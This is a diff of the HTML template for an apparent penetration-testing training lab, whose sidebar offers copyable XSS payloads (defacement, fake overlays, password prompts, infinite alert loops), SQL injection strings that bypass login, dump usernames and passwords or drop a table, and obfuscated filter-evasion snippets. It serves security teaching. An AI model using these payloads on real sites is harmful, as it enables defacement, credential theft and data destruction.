@@ -4,86 +4,145 @@
     <meta charset="UTF-8">
     <title>PenTest Lab</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; max-width: 1000px; margin: 0 auto; padding: 20px; padding-top: 60px; background-color: #ecf0f1; transition: margin-left .3s; }
-        .btn { padding: 10px 20px; border-radius: 5px; color: white; border: none; cursor: pointer; font-weight: bold; font-size: 14px; display: inline-block; text-decoration: none; box-sizing: border-box; }
-        .btn:hover { opacity: 0.9; }
-        .btn-full { width: 100%; display: block; margin-top: 5px; text-align: center; }
-        .btn-red { background-color: #e74c3c; } .btn-green { background-color: #27ae60; } .btn-blue { background-color: #3498db; } 
-        .btn-orange { background-color: #e67e22; } .btn-purple { background-color: #8e44ad; } .btn-gray { background: #7f8c8d; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 1000px; margin: 0 auto; padding: 20px; padding-top: 60px; background-color: #ecf0f1; transition: margin-left .3s; }
         
-        .menu-btn { position: fixed; top: 15px; left: 15px; z-index: 2000; background: #2c3e50; color: white; padding: 12px 20px; border-radius: 5px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.3); border:none; cursor: pointer; }
-        .sidebar { height: 100%; width: 0; position: fixed; top: 0; left: 0; z-index: 2001; background: #2c3e50; transition: 0.3s; color: white; box-shadow: 4px 0 10px rgba(0,0,0,0.5); overflow-y: auto; overflow-x: hidden; white-space: nowrap; visibility: hidden; }
+        /* --- КНОПКИ --- */
+        .btn { 
+            padding: 12px 24px; 
+            text-decoration: none; 
+            border-radius: 8px;
+            color: white; 
+            border: none; 
+            cursor: pointer; 
+            display: inline-block; 
+            font-weight: 600; 
+            font-size: 14px; 
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            position: relative;
+            line-height: normal;
+            font-family: inherit;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .btn:hover { opacity: 1; transform: translateY(-2px); box-shadow: 0 6px 12px rgba(0,0,0,0.15); }
+        .btn:active { transform: translateY(1px); box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        
+        .btn-full { width: 100%; display: block; margin-top: 5px; }
+        
+        .btn-red { background: linear-gradient(135deg, #e74c3c, #c0392b); }
+        .btn-green { background: linear-gradient(135deg, #27ae60, #219150); }
+        .btn-blue { background: linear-gradient(135deg, #3498db, #2980b9); }
+        .btn-gray { background: linear-gradient(135deg, #95a5a6, #7f8c8d); }
+        .btn-orange { background: linear-gradient(135deg, #e67e22, #d35400); }
+        .btn-purple { background: linear-gradient(135deg, #9b59b6, #8e44ad); }
+
+        .dash-card { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 15px; 
+            text-align: center; 
+            border-top: 5px solid #bdc3c7; 
+            display: flex; 
+            flex-direction: column; 
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05); 
+            transition: all 0.3s; 
+            height: 100%; /* Розтягує картку на повну висоту сітки */
+            box-sizing: border-box; /* Враховує padding у висоту */
+        }
+        
+        .dash-card:hover { 
+            transform: translateY(-10px) scale(1.02); 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15); 
+        }
+
+        .dash-card .btn {
+            margin-top: auto; 
+        }
+
+        .menu-btn { position: fixed; top: 15px; left: 15px; z-index: 2000; background: #2c3e50; color: white; padding: 12px 20px; border: none; cursor: pointer; border-radius: 5px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.3); transition: 0.3s;}
+        .menu-btn:hover { background: #34495e; }
+        
+        .sidebar { height: 100%; width: 0; position: fixed; z-index: 2001; top: 0; bottom: 0; left: 0; background-color: #2c3e50; transition: 0.3s; padding-top: 0; color: white; box-shadow: 4px 0 10px rgba(0,0,0,0.5); overflow-y: auto; overflow-x: hidden; white-space: nowrap; visibility: hidden; }
         .sidebar.open { width: 350px; visibility: visible; }
         
-        .profile-card { background: #1a252f; padding: 30px; text-align: center; border-bottom: 1px solid #34495e; position: relative; }
-        .closebtn { position: absolute; top: 10px; right: 15px; font-size: 30px; color: #7f8c8d; cursor: pointer; text-decoration: none; }
-        
-        .sidebar-section { padding: 20px; border-bottom: 1px solid #34495e; }
-        .sidebar h3 { margin-top: 0; color: #95a5a6; font-size: 14px; text-transform: uppercase; }
-        .sidebar-select { width: 100%; padding: 10px; background: #34495e; color: white; border: 1px solid #2c3e50; border-radius: 4px; margin-bottom: 10px; outline: none; cursor: pointer; }
-        .code-preview { width: 100%; height: 120px; background: #000; color: #0f0; border: 1px solid #333; font-family: monospace; padding: 10px; box-sizing: border-box; resize: vertical; font-size: 11px; margin-bottom: 10px; white-space: pre-wrap; }
+        .profile-card { background: #1a252f; padding: 30px 20px; text-align: center; border-bottom: 2px solid #34495e; margin-bottom: 10px; position: relative; }
+        .profile-avatar { font-size: 50px; margin-bottom: 10px; display: block; }
+        .profile-name { font-size: 20px; font-weight: bold; color: #fff; display: block; }
+        .profile-role { font-size: 14px; color: #3498db; margin-bottom: 15px; display: block; text-transform: uppercase; }
+        .closebtn { position: absolute; top: 10px; right: 15px; font-size: 30px; text-decoration: none; color: #7f8c8d; cursor: pointer; }
 
-        .top-bar { display: flex; justify-content: flex-end; margin-bottom: 20px; }
-        .box { background: white; padding: 25px; border-radius: 8px; margin-bottom: 25px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); position: relative; }
+        .sidebar-section { padding: 15px 20px; border-bottom: 1px solid #34495e; white-space: normal; }
+        .sidebar h3 { margin-top: 0; color: #95a5a6; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px;}
+        .sidebar-select { width: 100%; padding: 10px; background: #34495e; color: white; border: 1px solid #2c3e50; border-radius: 4px; margin-bottom: 10px; cursor: pointer; outline: none; box-sizing: border-box; }
+        .code-preview { width: 100%; height: 120px; background: #000; color: #0f0; border: 1px solid #333; font-family: 'Courier New', monospace; padding: 10px; box-sizing: border-box; resize: vertical; font-size: 11px; white-space: pre-wrap; word-break: break-all; margin-bottom: 10px; }
+
+        .top-bar { display: flex; justify-content: flex-end; align-items: center; margin-bottom: 20px; background: transparent; padding: 0; }
+        .box { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-bottom: 25px; position: relative; }
         
-        #toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; pointer-events: none; }
-        .toast { min-width: 250px; margin-bottom: 10px; background: #333; color: #fff; padding: 15px; border-radius: 5px; opacity: 0; transition: 0.5s; transform: translateY(-20px); }
-        .toast.show { opacity: 1; transform: translateY(0); }
-        
-        /* UI Helpers */
-        .dash-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
-        .dash-card { background: white; padding: 30px; border-radius: 10px; text-align: center; border-top: 5px solid #bdc3c7; display: flex; flex-direction: column; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-        .dash-card h2 { margin-top: 0; }
-        select.form-select { display: block; width: 100%; padding: 10px; border: 1px solid #bdc3c7; border-radius: 4px; margin-bottom: 10px; cursor: pointer; background: white; color: black; appearance: auto; z-index: 10; position: relative; }
-        .nav-header { background-color: #34495e; color: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
         .file-rules { padding: 10px; margin: 10px 0; border-radius: 5px; font-size: 14px; font-weight: bold; display: block; text-align: center;}
         .rules-danger { background-color: #fadbd8; color: #c0392b; border: 1px solid #e6b0aa; }
         .rules-success { background-color: #d4efdf; color: #1e8449; border: 1px solid #a9dfbf; }
         .separator { margin: 20px 0; border-top: 1px dashed #ccc; position: relative; text-align: center; }
         .separator span { background: #fff; padding: 0 10px; position: relative; top: -12px; color: #7f8c8d; font-size: 12px; font-weight: bold;}
+        select.form-select { display: block; width: 100%; padding: 10px; border: 1px solid #bdc3c7; border-radius: 4px; margin-bottom: 10px; cursor: pointer; font-size: 14px; background-color: white; color: black; appearance: auto; position: relative; z-index: 10; box-sizing: border-box; }
+        
+        #main { padding-bottom: 100px; }
+        .nav-header { background-color: #34495e; color: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .dash-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
+
+        #toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; pointer-events: none; }
+        .toast { min-width: 250px; margin-bottom: 10px; background-color: #333; color: #fff; padding: 15px; border-radius: 5px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); opacity: 0; transition: opacity 0.5s, transform 0.5s; transform: translateY(-20px); display: flex; align-items: center; pointer-events: auto; }
+        .toast.show { opacity: 1; transform: translateY(0); }
+        .toast.success { background-color: #27ae60; }
+        .toast.error { background-color: #e74c3c; }
+        .toast.info { background-color: #3498db; }
     </style>
 </head>
 <body>
+
     <div id="toast-container"></div>
-    
+
+    {# --- БОКОВЕ МЕНЮ --- #}
     {% if request.endpoint != 'dashboard' %}
         <button class="menu-btn" id="menuBtn" onclick="openNav()">☰ HACKER MENU</button>
+
+        <div id="mySidebar" class="sidebar">
+            <div class="profile-card">
+                <a class="closebtn" onclick="closeNav()">&times;</a>
+                <span class="profile-avatar">👤</span>
+                <span class="profile-name">{{ session.username }}</span>
+                <span class="profile-role">[{{ session.role }}]</span>
+                <a href="/logout" class="btn btn-red btn-full">LOGOUT</a>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>🛠️ TOOLS</h3>
+                <select id="tools-select" class="sidebar-select">
+                    <option value="/dashboard">🏠 DASHBOARD</option>
+                    <option value="/">💬 XSS LAB</option>
+                    <option value="/sqli">💉 SQL INJECTION</option>
+                    <option value="/stealth">🛡️ EVASION LAB</option>
+                </select>
+                <button class="btn btn-purple btn-full" onclick="openTool()">GO TO PAGE</button>
+            </div>
+
+            <div class="sidebar-section" id="payload-section" style="display:none;">
+                <h3 id="payload-title">💉 PAYLOADS</h3>
+                <select id="payload-select" class="sidebar-select" onchange="updatePayloadPreview()"></select>
+                <textarea id="payload-preview" class="code-preview" readonly></textarea>
+                <button class="btn btn-green btn-full" onclick="copyFromPreview()">COPY PAYLOAD 📋</button>
+            </div>
+            
+            <div style="height: 100px;"></div>
+        </div>
     {% endif %}
-
-    <div id="mySidebar" class="sidebar">
-        <div class="profile-card">
-            <a class="closebtn" onclick="closeNav()">&times;</a>
-            <div style="font-size: 40px;">👤</div>
-            <div><b>{{ session.username }}</b></div>
-            <div style="color: #3498db; font-size: 12px;">[{{ session.role }}]</div>
-            <a href="/logout" class="btn btn-red btn-full">🚪 LOGOUT</a>
-        </div>
-
-        <div class="sidebar-section">
-            <h3>🛠️ NAVIGATION</h3>
-            <select id="tools-select" class="sidebar-select">
-                <option value="/dashboard">🏠 DASHBOARD</option>
-                <option value="/">💬 XSS LAB</option>
-                <option value="/sqli">💉 SQL INJECTION</option>
-                <option value="/stealth">🛡️ EVASION LAB</option>
-            </select>
-            <button class="btn btn-purple btn-full" onclick="openTool()">GO TO PAGE</button>
-        </div>
-
-        <div class="sidebar-section" id="payload-section">
-            <h3>💣 PAYLOADS</h3>
-            <select id="payload-select" class="sidebar-select"></select>
-            <textarea id="payload-preview" class="code-preview" readonly></textarea>
-            <button class="btn btn-green btn-full" onclick="copyFromPreview()">COPY PAYLOAD 📋</button>
-        </div>
-        <div style="height: 100px;"></div>
-    </div>
 
     <div id="main">
         <div class="top-bar">
-            {% if session.get('username') %}
+            {% if session.get('username') and request.endpoint != 'dashboard' %}
                 <form action="/reset_db" method="post" style="display:inline;" class="ajax-form">
-                    <button type="submit" class="btn btn-red" style="font-size: 12px;">🗑️ CLEAN DB</button>
+                    <button type="submit" class="btn btn-red" style="padding: 8px 15px; font-size: 12px;">🗑️ CLEAN DB</button>
                 </form>
             {% endif %}
         </div>
@@ -91,127 +150,145 @@
     </div>
 
     <script>
-    document.addEventListener("DOMContentLoaded", function() {
         const PAYLOADS_DB = {
             '/': {
-                "1. Alert": "<script>alert('XSS')<\/script>",
-                "2. Cookie": "<script>alert(document.cookie)<\/script>",
-                "3. Redirect": "<script>window.location='http://google.com'<\/script>",
-                "4. Matrix": "<script>window.location='http://matrixscreensaver.online'<\/script>"
+                "title": "💉 XSS PAYLOADS (FULL)",
+                "data": {
+                    "1. Classic Alert": "<script>alert('XSS')<\/script>",
+                    "2. User Prompt": "<script>prompt('Please enter password:')<\/script>",
+                    "3. Visual Defacement": "<style>body { filter: invert(100%); background: black; transform: rotate(1deg); }<\/style> <h1 style=\"color:red; font-size: 50px; text-align:center;\">HACKED!<\/h1>",
+                    "4. Image Error": "<img src=x onerror=alert('Image OnError XSS')>",
+                    "5. SVG House": "<svg width=\"200\" height=\"200\" onload=\"alert(1)\"><polygon points=\"100,10 190,90 10,90\" fill=\"brown\"/><rect x=\"30\" y=\"90\" width=\"140\" height=\"90\" fill=\"yellow\" stroke=\"black\"/><rect x=\"80\" y=\"130\" width=\"40\" height=\"50\" fill=\"red\"/></svg>",
+                    "6. Body OnLoad": "<body onload=alert('Body OnLoad XSS')>",
+                    "7. Input Autofocus": "<input onfocus=alert('Autofocus XSS') autofocus>",
+                    "8. Details Toggle": "<details open ontoggle=alert('Details Toggle XSS')>",
+                    "9. Page Redout": "<style>body{background:red !important;}</style>",
+                    "10. Upside Down": "<style>body{transform: rotate(180deg); transition: 2s;}</style>",
+                    "11. Content Replace": "<script>document.body.innerHTML=\"<h1 style='color:red;font-size:100px'>HACKED BY YOU</h1>\";<\/script>",
+                    "12. Fake Overlay": "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:rgba(0,0,0,0.5);\"></div>",
+                    "13. Cookie Stealer": "<script>alert('COOKIES: ' + document.cookie)<\/script>",
+                    "14. Fake Login": "<div style=\"position:fixed;inset:0;background:#fff;z-index:9999;display:grid;place-content:center;font-family:sans-serif\"><h2>Critical Security Update</h2><button onclick=\"document.documentElement.requestFullscreen()\" style=\"padding:15px;background:blue;color:white;\">INSTALL</button></div>",
+                    "15. Redirect": "<script>window.location='http://google.com'<\/script>",
+                    "16. TOTAL CHAOS": "<marquee scrollamount=50 style=\"position:fixed;inset:0;background:#000;color:red;z-index:99999;font:25vw Impact;line-height:100vh\">CHAOS</marquee>",
+                    "17. Visual SPAM": "<script>setInterval(()=>{let e=document.createElement('b');e.innerText='SPAM';e.style.cssText='position:fixed;z-index:9999;color:red;font-size:30px;top:'+Math.random()*98+'vh;left:'+Math.random()*98+'vw';document.body.append(e)},50)<\/script>",
+                    "18. Annoying Sound": "<audio src=\"https://media.geeksforgeeks.org/wp-content/uploads/20190531135120/beep.mp3\" autoplay loop></audio>",
+                    "19. Mouse Trap": "<button onmouseover=\"alert('Gotcha!')\" style=\"font-size:30px; padding:20px;\">Don't Touch Me</button>",
+                    "20. JS Link": "<a href=\"javascript:while(true){alert('Loop')}\" style=\"font-size:30px\">FREE MONEY</a>"
+                }
             },
             '/sqli': {
-                "1. Bypass": "' OR '1'='1",
-                "2. Union Test": "' UNION SELECT 1, 'text', 'text' --",
-                "3. DB Version": "' UNION SELECT 1, version(), 'info' --",
-                "4. Users": "' UNION SELECT 1, username, 'user' FROM users --",
-                "5. Passwords": "' UNION SELECT id, username, password FROM users --"
+                "title": "💉 SQL INJECTIONS",
+                "data": {
+                    "1. Auth Bypass (OR)": "' OR '1'='1",
+                    "2. Comment Bypass": "admin' --",
+                    "3. Union Test": "' UNION SELECT 1, 'test', 'test' --",
+                    "4. DB Version": "' UNION SELECT 1, version(), 'info' --",
+                    "5. Dump Users": "' UNION SELECT id, username, password FROM users --",
+                    "6. Drop Table (Danger)": "'; DROP TABLE users; --"
+                }
             },
             '/stealth': {
-                "1. Brain-Melt": "<svg/id=\"x\" on\&#108;oad=\"[].sort.constructor('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029')()\">",
-                "2. JJEncode": "$=~[];$={___:++$,$$$$:(![]+\"\")[$]};$.$($.$($.$$+\"\\\"\")())();",
-                "3. Base64": "<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>"
+                 "title": "🛡️ EVASION SNIPPETS",
+                 "data": {
+                     "Polyglot": "javascript://%250Aalert(1)//",
+                     "JJEncode": "$=~[];$={___:++$,$$$$:(![]+\"\")[$]};",
+                     "Base64 Exec": "eval(atob('YWxlcnQoMSk='))"
+                 }
             }
         };
 
-        // --- INIT MENU ---
-        const path = window.location.pathname;
-        const payloadSection = document.getElementById('payload-section');
-        const payloadSelect = document.getElementById('payload-select');
-        const toolsSelect = document.getElementById('tools-select');
+        document.addEventListener("DOMContentLoaded", function() {
+            const path = window.location.pathname;
+            const payloadSection = document.getElementById('payload-section');
+            const payloadSelect = document.getElementById('payload-select');
+            const payloadTitle = document.getElementById('payload-title');
 
-        // Load Payloads
-        let currentPayloads = PAYLOADS_DB[path] || {};
-        if (Object.keys(currentPayloads).length === 0) {
-            if (payloadSection) payloadSection.style.display = 'none';
-        } else {
-            for (const [name, code] of Object.entries(currentPayloads)) {
-                let option = document.createElement('option');
-                option.value = name; option.text = name;
-                payloadSelect.appendChild(option);
+            if (payloadSection && PAYLOADS_DB[path]) {
+                payloadSection.style.display = 'block';
+                payloadTitle.innerText = PAYLOADS_DB[path].title;
+                const payloads = PAYLOADS_DB[path].data;
+                for (const [name, code] of Object.entries(payloads)) {
+                    let option = document.createElement('option');
+                    option.value = code; option.text = name;
+                    payloadSelect.appendChild(option);
+                }
+                updatePayloadPreview();
             }
-            // Restore selection
-            const savedKey = 'lastPayload_' + path;
-            const savedVal = localStorage.getItem(savedKey);
-            if (savedVal && currentPayloads[savedVal]) payloadSelect.value = savedVal;
-            
-            updatePreview();
-            payloadSelect.addEventListener('change', () => {
-                localStorage.setItem(savedKey, payloadSelect.value);
-                updatePreview();
-            });
-        }
+        });
 
-        // Restore Tool
-        const savedTool = localStorage.getItem('lastTool');
-        if (savedTool && [...toolsSelect.options].some(o => o.value === savedTool)) {
-            toolsSelect.value = savedTool;
-        }
-        toolsSelect.addEventListener('change', () => localStorage.setItem('lastTool', toolsSelect.value));
+        function openNav() { document.getElementById("mySidebar").classList.add('open'); }
+        function closeNav() { document.getElementById("mySidebar").classList.remove('open'); }
 
-        // --- GLOBAL FUNCTIONS ---
-        window.openNav = function() { document.getElementById("mySidebar").classList.add('open'); if(payloadSelect) updatePreview(); }
-        window.closeNav = function() { document.getElementById("mySidebar").classList.remove('open'); }
-        window.openTool = function() { window.location.href = toolsSelect.value; }
-        window.copyFromPreview = function() {
-            const ta = document.getElementById('payload-preview');
-            if(ta) {
-                ta.select(); document.execCommand('copy');
-            }
-        }
-
-        function updatePreview() {
-            if(payloadSelect && payloadSelect.selectedIndex !== -1) {
-                const key = payloadSelect.options[payloadSelect.selectedIndex].value;
-                document.getElementById('payload-preview').value = currentPayloads[key];
-            }
-        }
-
-        document.addEventListener('click', function(e) {
-            const sb = document.getElementById('mySidebar');
-            const btn = document.getElementById('menuBtn');
-            if (sb.classList.contains('open') && !sb.contains(e.target) && (!btn || !btn.contains(e.target))) {
+        document.addEventListener('click', function(event) {
+            const sidebar = document.getElementById('mySidebar');
+            const menuBtn = document.getElementById('menuBtn');
+            if (sidebar && sidebar.classList.contains('open') && !sidebar.contains(event.target) && !menuBtn.contains(event.target)) {
                 closeNav();
             }
         });
 
-        // --- AJAX ---
+        function openTool() { window.location.href = document.getElementById('tools-select').value; }
+
+        function updatePayloadPreview() {
+            const select = document.getElementById('payload-select');
+            if(select && select.value) document.getElementById('payload-preview').value = select.value;
+        }
+
+        function copyFromPreview() {
+            const textarea = document.getElementById('payload-preview');
+            textarea.select(); document.execCommand('copy'); 
+            const btn = document.querySelector('.btn-green.btn-full');
+            const originalText = btn.innerText;
+            btn.innerText = "COPIED! ✅";
+            setTimeout(() => { btn.innerText = originalText; }, 1000);
+        }
+
         document.querySelectorAll('.ajax-form').forEach(form => {
             form.onsubmit = async (e) => {
-                e.preventDefault();
-                const fd = new FormData(form);
+                e.preventDefault(); 
+                const formData = new FormData(form);
+                const action = form.getAttribute('action');
                 try {
-                    const res = await fetch(form.getAttribute('action'), { method: 'POST', body: fd, headers: { 'X-Requested-With': 'XMLHttpRequest' } });
-                    if (res.ok) {
-                        const data = await response.json(); // ТУТ БУЛА ПОМИЛКА 'response' -> 'res'
+                    const response = await fetch(action, {
+                        method: 'POST', body: formData, headers: { 'X-Requested-With': 'XMLHttpRequest' }
+                    });
+                    if (response.ok) {
+                        const data = await response.json();
                         showToast(data.message, data.status);
-                        if (data.status === 'success' && form.getAttribute('action') === '/') form.reset();
-                    }
-                } catch(e) {}
+                        if (action === '/' && data.status === 'success') form.reset();
+                    } else { showToast('Server Error', 'error'); }
+                } catch(e) { console.error(e); }
             };
         });
 
-        function showToast(msg, type) {
-            const t = document.createElement('div'); t.className = `toast ${type}`; t.innerText = msg;
-            document.getElementById('toast-container').appendChild(t);
-            setTimeout(() => t.classList.add('show'), 100);
-            setTimeout(() => { t.classList.remove('show'); setTimeout(() => t.remove(), 500); }, 3000);
+        function showToast(message, type) {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.innerText = message;
+            container.appendChild(toast);
+            setTimeout(() => { toast.classList.add('show'); }, 100);
+            setTimeout(() => { toast.classList.remove('show'); setTimeout(() => { toast.remove(); }, 500); }, 3000);
         }
 
-        // DB Check
         let currentVersion = null;
-        setInterval(async () => {
+        async function checkDbVersion() {
             try {
                 const res = await fetch('/check_db_version');
                 const data = await res.json();
-                if (currentVersion === null) currentVersion = data.version;
-                else if (currentVersion !== data.version) {
-                    if (location.pathname.includes('/vulnerable') || location.pathname.includes('/secure')) location.reload();
-                    else showToast('DB Cleared', 'info');
+                if (currentVersion === null) {
+                    currentVersion = data.version;
+                } else if (currentVersion !== data.version) {
+                    if (window.location.pathname.includes('/vulnerable') || window.location.pathname.includes('/secure')) {
+                        window.location.reload(); 
+                    } else {
+                        showToast('База даних очищена', 'info');
+                    }
                     currentVersion = data.version;
                 }
-            } catch (e) {}
-        }, 1000);
-    });
+            } catch (e) { }
+        }
+        setInterval(checkDbVersion, 1000);
     </script>
 </body>
 </html>
